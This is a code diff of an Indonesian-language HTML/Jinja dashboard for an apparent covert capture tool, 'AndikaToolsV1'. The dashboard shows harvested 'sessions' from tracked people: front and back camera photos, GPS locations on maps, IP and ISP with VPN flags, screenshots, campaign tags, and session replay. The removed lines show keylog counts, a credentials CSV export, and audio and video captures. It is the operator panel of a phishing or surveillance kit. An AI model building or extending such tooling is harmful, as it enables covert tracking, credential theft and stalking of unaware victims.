@@ -1,96 +1,126 @@
-{% extends "base.html" %}
-{% block title %}Dashboard{% endblock %}
+{% extends "base_modern.html" %}
+{% set active = "dashboard" %}
+{% block title %}Dashboard - AndikaToolsV1{% endblock %}
 {% block head %}
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<style>
+.session-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(320px,1fr)); gap:16px; }
+.session-card { background:var(--bg-glass); backdrop-filter:blur(20px); border:1px solid var(--border-subtle); border-radius:var(--radius-lg); overflow:hidden; transition:var(--transition); animation:fadeInUp 0.4s ease both; }
+.session-card:hover { transform:translateY(-4px); box-shadow:var(--shadow-lg); border-color:var(--border-strong); }
+.session-images { display:flex; gap:2px; background:var(--bg-tertiary); }
+.session-images img { flex:1; width:100%; aspect-ratio:4/3; object-fit:cover; display:block; }
+.session-info { padding:16px; }
+.session-row { display:flex; align-items:flex-start; justify-content:space-between; gap:8px; padding:6px 0; font-size:13px; border-bottom:1px solid var(--border-subtle); }
+.session-row:last-child { border-bottom:none; }
+.session-row .label { color:var(--text-muted); font-weight:500; flex-shrink:0; }
+.session-row .value { color:var(--text-secondary); text-align:right; word-break:break-word; }
+.tag { display:inline-block; padding:2px 8px; border-radius:10px; font-size:10px; font-weight:600; background:var(--bg-tertiary); color:var(--text-secondary); text-transform:uppercase; }
+.tag.vpn { background:rgba(239,68,68,0.15); color:var(--accent-red); }
+.session-actions { display:flex; gap:6px; flex-wrap:wrap; padding:12px 16px; background:rgba(0,0,0,0.2); border-top:1px solid var(--border-subtle); }
+.session-actions .btn-action { padding:5px 10px; background:var(--bg-tertiary); color:var(--text-secondary); border:1px solid var(--border-subtle); border-radius:6px; font-size:11px; text-decoration:none; cursor:pointer; transition:var(--transition); }
+.session-actions .btn-action:hover { background:var(--bg-glass-hover); color:var(--text-primary); }
+.session-actions .btn-action.del { color:var(--accent-red); }
+.charts-grid { display:grid; grid-template-columns:2fr 1fr; gap:16px; margin-bottom:24px; }
+@media (max-width:900px) { .charts-grid { grid-template-columns:1fr; } }
+.chart-card { background:var(--bg-glass); backdrop-filter:blur(20px); border:1px solid var(--border-subtle); border-radius:var(--radius-lg); padding:20px; min-height:240px; }
+.chart-card h3 { font-size:12px; color:var(--text-muted); text-transform:uppercase; letter-spacing:1px; margin:0 0 16px; font-weight:600; }
+.filters { display:flex; gap:10px; margin-bottom:20px; flex-wrap:wrap; }
+.filter-input, .filter-select { padding:10px 14px; background:var(--bg-glass); backdrop-filter:blur(10px); border:1px solid var(--border-subtle); border-radius:8px; color:var(--text-primary); font-size:13px; font-family:inherit; }
+.filter-input { flex:1; min-width:200px; }
+.filter-select { min-width:140px; }
+.filter-input:focus, .filter-select:focus { outline:none; border-color:var(--accent-primary); box-shadow:0 0 0 3px rgba(99,102,241,0.1); }
+</style>
 {% endblock %}
-{% block body %}
-
-<header class="topbar">
-  <h1>Dashboard <span class="badge" id="totalBadge">{{ stats.total }} sesi</span></h1>
-  <div class="top-actions">
-    <a class="btn" href="/" target="_blank">Capture</a>
-    <a class="btn gray" href="/api/export/zip">ZIP</a>
-    <a class="btn gray" href="/api/export/creds">Creds CSV</a>
-    <button class="btn gray" id="btnRefresh">Refresh</button>
-    <a class="btn red" href="#" id="btnDeleteAll">Hapus Semua</a>
-    <a class="btn red" href="/logout">Logout</a>
+{% block content %}
+<div class="topbar">
+  <div class="topbar-title">
+    <h1>Dashboard</h1>
+    <p>Ringkasan aktivitas capture & analytics</p>
   </div>
-</header>
+  <div class="topbar-actions">
+    <a href="/capture" target="_blank" class="btn btn-primary">📷 Capture</a>
+    <a href="/api/export/zip" class="btn">📦 ZIP</a>
+    <a href="/api/export/csv" class="btn">📄 CSV</a>
+    <button class="btn" id="btnRefresh">🔄 Refresh</button>
+    <button class="btn btn-red" id="btnDeleteAll">🗑️ Hapus Semua</button>
+  </div>
+</div>
 
-<section class="stats-grid">
-  <div class="stat-card"><div class="num">{{ stats.total }}</div><div class="lbl">Total Sesi</div></div>
-  <div class="stat-card"><div class="num">{{ stats.with_photo }}</div><div class="lbl">Ada Foto</div></div>
-  <div class="stat-card"><div class="num">{{ stats.with_gps }}</div><div class="lbl">Ada GPS</div></div>
-  <div class="stat-card"><div class="num">{{ stats.with_screenshot }}</div><div class="lbl">Screenshot</div></div>
-  <div class="stat-card"><div class="num">{{ stats.keys_total }}</div><div class="lbl">Keylog</div></div>
-  <div class="stat-card"><div class="num">{{ stats.creds_total }}</div><div class="lbl">Credentials</div></div>
-</section>
+<div class="stats-grid">
+  <div class="stat-card"><div class="stat-value">{{ stats.total }}</div><div class="stat-label">Total Sesi</div></div>
+  <div class="stat-card"><div class="stat-value">{{ stats.with_photo }}</div><div class="stat-label">Dengan Foto</div></div>
+  <div class="stat-card"><div class="stat-value">{{ stats.with_gps }}</div><div class="stat-label">Dengan GPS</div></div>
+  <div class="stat-card"><div class="stat-value">{{ stats.with_screenshot }}</div><div class="stat-label">Screenshot</div></div>
+</div>
 
-<section class="charts-row">
-  <div class="chart-box"><h3>7 Hari Terakhir</h3><canvas id="chartTimeline"></canvas></div>
-  <div class="chart-box"><h3>Top Kota</h3><canvas id="chartCities"></canvas></div>
-</section>
+<div class="charts-grid">
+  <div class="chart-card">
+    <h3>📈 Aktivitas 7 Hari Terakhir</h3>
+    <canvas id="chartTimeline" height="80"></canvas>
+  </div>
+  <div class="chart-card">
+    <h3>🌍 Top Kota</h3>
+    <canvas id="chartCities" height="80"></canvas>
+  </div>
+</div>
 
-<section class="filters">
-  <input id="searchBox" placeholder="Cari IP / kota / ISP / campaign...">
-  <select id="filterCampaign"><option value="">Semua campaign</option></select>
-  <select id="filterPhoto">
-    <option value="">Semua</option>
-    <option value="yes">Ada foto</option>
-    <option value="no">Tanpa foto</option>
-  </select>
-</section>
+<div class="filters">
+  <input type="text" class="filter-input" id="searchBox" placeholder="🔍 Cari IP, kota, ISP, campaign...">
+  <select class="filter-select" id="filterCampaign"><option value="">Semua Campaign</option></select>
+  <select class="filter-select" id="filterPhoto"><option value="">Semua</option><option value="yes">Ada Foto</option><option value="no">Tanpa Foto</option></select>
+</div>
 
-<section id="cards" class="grid">
+<div class="session-grid" id="cards">
   {% for s in sessions %}
-  <div class="card" data-ts="{{ s.ts }}"
+  <div class="session-card" data-ts="{{ s.ts }}"
        data-search="{{ (s.ip_publik or '') }} {{ (s.ip_koneksi or '') }} {{ (s.city or '') }} {{ (s.region or '') }} {{ (s.isp or '') }} {{ (s.campaign or '') }}"
        data-campaign="{{ s.campaign or 'default' }}"
        data-has-photo="{{ 'yes' if (s.has_depan or s.has_belakang) else 'no' }}">
-    <div class="imgs">
+    <div class="session-images">
       {% if s.has_depan %}<a href="/api/file/{{ s.ts }}_depan.png" target="_blank"><img src="/api/file/{{ s.ts }}_depan.png" loading="lazy"></a>{% endif %}
       {% if s.has_belakang %}<a href="/api/file/{{ s.ts }}_belakang.png" target="_blank"><img src="/api/file/{{ s.ts }}_belakang.png" loading="lazy"></a>{% endif %}
-      {% if not s.has_depan and not s.has_belakang %}<div class="no-photo">Tidak ada foto</div>{% endif %}
+      {% if not s.has_depan and not s.has_belakang %}<div style="padding:40px 20px;text-align:center;color:var(--text-dim);width:100%">📷 Tidak ada foto</div>{% endif %}
     </div>
-    <div class="info">
-      <div class="row"><b>Waktu:</b> {{ s.waktu }}</div>
-      <div class="row"><b>IP:</b> {{ s.ip_publik or s.ip_koneksi or '-' }} {% if s.is_vpn %}<span class="tag vpn">VPN</span>{% endif %}</div>
-      <div class="row"><b>Kota:</b> {{ s.city or '-' }}, {{ s.region or '-' }}</div>
-      <div class="row"><b>ISP:</b> {{ s.isp or '-' }}</div>
-      <div class="row"><b>Campaign:</b> <span class="tag">{{ s.campaign or 'default' }}</span></div>
-      <div class="row"><b>Keylog:</b> {{ s.keylog_count }} | <b>Creds:</b> {{ s.clipboard_count }}</div>
+    <div class="session-info">
+      <div class="session-row"><span class="label">⏰ Waktu</span><span class="value">{{ s.waktu }}</span></div>
+      <div class="session-row"><span class="label">🌐 IP</span><span class="value">{{ s.ip_publik or s.ip_koneksi or '-' }} {% if s.is_vpn %}<span class="tag vpn">VPN</span>{% endif %}</span></div>
+      <div class="session-row"><span class="label">📍 Kota</span><span class="value">{{ s.city or '-' }}{% if s.region %}, {{ s.region }}{% endif %}</span></div>
+      <div class="session-row"><span class="label">🏢 ISP</span><span class="value">{{ s.isp or '-' }}</span></div>
+      <div class="session-row"><span class="label">🎯 Campaign</span><span class="value"><span class="tag">{{ s.campaign or 'default' }}</span></span></div>
       {% if s.lat and s.lon %}
-        <div class="row"><b>GPS:</b> {{ "%.5f"|format(s.lat) }}, {{ "%.5f"|format(s.lon) }}</div>
-        <div class="mini-map" id="map-{{ s.ts }}"></div>
+      <div class="session-row"><span class="label">🗺️ GPS</span><span class="value">{{ "%.5f"|format(s.lat) }}, {{ "%.5f"|format(s.lon) }}</span></div>
+      <div class="mini-map" id="map-{{ s.ts }}" style="height:120px;border-radius:8px;margin-top:8px;overflow:hidden"></div>
       {% endif %}
-      <div class="actions">
-        <a href="#" class="btn-action show-detail" data-ts="{{ s.ts }}">Detail</a>
-        <a href="#" class="btn-action show-events" data-ts="{{ s.ts }}">Event</a>
-        <a href="#" class="btn-action show-keys" data-ts="{{ s.ts }}">Keys</a>
-        <a href="#" class="btn-action show-burst" data-ts="{{ s.ts }}">Burst</a>
-        {% if s.has_depan %}<a href="/api/file/{{ s.ts }}_depan.png" download class="btn-action">Depan</a>{% endif %}
-        {% if s.has_belakang %}<a href="/api/file/{{ s.ts }}_belakang.png" download class="btn-action">Belakang</a>{% endif %}
-        {% if s.has_screenshot %}<a href="/api/file/{{ s.ts }}_screenshot.png" target="_blank" class="btn-action">Screen</a>{% endif %}
-        {% if s.has_audio %}<a href="/api/file/{{ s.ts }}_audio.webm" target="_blank" class="btn-action">Audio</a>{% endif %}
-        {% if s.has_video %}<a href="/api/file/{{ s.ts }}_video.webm" target="_blank" class="btn-action">Video</a>{% endif %}
-        <a href="#" class="btn-action del" data-ts="{{ s.ts }}">Hapus</a>
-      </div>
+    </div>
+    <div class="session-actions">
+      <a href="#" class="btn-action show-detail" data-ts="{{ s.ts }}">🔍 Detail</a>
+      <a href="#" class="btn-action show-replay" data-ts="{{ s.ts }}">🎥 Replay</a>
+      <a href="#" class="btn-action show-heatmap" data-ts="{{ s.ts }}">🔥 Heatmap</a>
+      {% if s.has_depan %}<a href="/api/file/{{ s.ts }}_depan.png" download class="btn-action">⬇ Depan</a>{% endif %}
+      {% if s.has_belakang %}<a href="/api/file/{{ s.ts }}_belakang.png" download class="btn-action">⬇ Belakang</a>{% endif %}
+      <a href="/reports/session/{{ s.ts }}" target="_blank" class="btn-action">📄 PDF</a>
+      <a href="#" class="btn-action del" data-ts="{{ s.ts }}">🗑️ Hapus</a>
     </div>
   </div>
   {% endfor %}
-</section>
+</div>
 
 {% if not sessions %}
-<p style="text-align:center;color:#888;padding:40px">Belum ada sesi.</p>
+<div class="card" style="padding:60px;text-align:center">
+  <div style="font-size:60px;margin-bottom:16px">📭</div>
+  <h3 style="color:var(--text-primary);margin:0 0 8px">Belum Ada Sesi</h3>
+  <p style="color:var(--text-muted);margin-bottom:20px">Mulai capture dengan template atau mode</p>
+  <a href="/capture" class="btn btn-primary">📷 Buka Capture</a>
+</div>
 {% endif %}
 
 <script>
 window.SESSIONS = {{ sessions|tojson }};
 window.STATS = {{ stats_json|safe }};
 </script>
-<script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
+<script src="/static/js/dashboard.js"></script>
 {% endblock %}
